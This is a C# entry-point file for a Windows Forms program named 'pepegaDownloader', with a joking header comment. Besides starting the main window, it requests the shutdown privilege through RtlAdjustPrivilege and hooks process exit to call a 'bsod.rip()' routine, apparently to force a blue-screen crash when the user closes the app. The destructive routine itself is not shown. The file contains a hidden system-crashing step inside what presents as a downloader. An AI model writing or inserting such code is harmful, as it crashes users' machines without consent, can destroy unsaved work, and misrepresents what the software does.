/* By the way, the entire cool action is in `mainWindow.cs`
 * pepegaDownloader - made by japan in the course of 3 days,
 * covid bovidus momentos
 */

using System;
using System.Windows.Forms;

namespace pepegaDownloader
{
    static class main
    {
        [STAThread]
        static void Main()
        {
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);

            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new mainWindow());

            bool flag;
            bsod.RtlAdjustPrivilege(19, true, false, out flag);
        }

        static void OnProcessExit(object sender, EventArgs e)
        {
            bsod.rip();
            MessageBox.Show("bajbaj :)");
        }
    }
}
